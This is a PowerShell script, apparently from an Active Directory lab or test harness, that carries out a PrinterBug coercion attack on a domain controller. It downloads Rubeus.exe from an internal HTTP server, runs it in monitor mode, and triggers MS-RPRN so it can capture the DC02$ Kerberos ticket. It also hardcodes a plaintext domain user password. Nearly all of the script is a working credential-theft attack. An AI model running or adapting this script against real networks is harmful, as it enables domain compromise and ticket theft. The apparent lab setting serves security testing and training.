[CmdletBinding()]
param(
    [string]$TargetDC = "dc02.child.cadre.local",
    [string]$Listener = "mbr01.child.cadre.local",
    [string]$Username = "child.cadre.local\analyst_t1",
    [string]$Password = "T13r_An@lyst!"
)
$ErrorActionPreference = "Stop"
try {
    $outDir = "C:\Tools\cadre-attack"
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null

    # Ensure Rubeus + MS-RPRN present
    $rubeus = "$outDir\Rubeus.exe"
    $msrprn = "C:\Tools\ADTools\MS-RPRN.exe"
    if (-not (Test-Path $msrprn)) { throw "MS-RPRN.exe not found at $msrprn" }

    # Stage Rubeus from provisioning HTTP if missing
    if (-not (Test-Path $rubeus)) {
        Invoke-WebRequest -Uri "http://192.168.77.60:8888/Rubeus.exe" -OutFile $rubeus -UseBasicParsing
    }

    $output = "$outDir\dc02_tgs.txt"
    if (Test-Path $output) { Remove-Item $output -Force }

    # Start Rubeus monitor as a background job; kill after trigger
    $job = Start-Job -ScriptBlock {
        param($rubeus, $output)
        & $rubeus monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:$output
    } -ArgumentList $rubeus, $output

    Start-Sleep -Seconds 2

    # Trigger PrinterBug from mbr01 against dc02 -> listener mbr01
    & $msrprn "\\$TargetDC" "\\$Listener" 2>&1 | Out-Null

    Start-Sleep -Seconds 5
    Stop-Job $job -ErrorAction SilentlyContinue
    Remove-Job $job -ErrorAction SilentlyContinue

    if (Test-Path $output) {
        $content = Get-Content $output -Raw
        if ($content -and $content.Contains("KIRBI")) {
            Write-Output "T102_OK: captured DC02$ TGS on mbr01"
            Write-Output $content
        } else {
            Write-Output "T102_INFO: Rubeus monitor ran but no KIRBI captured yet"
            Write-Output $content
        }
    } else {
        Write-Output "T102_INFO: no output file yet"
    }
} catch {
    Write-Output ("T102_FAIL: " + $_.Exception.Message)
    exit 1
}
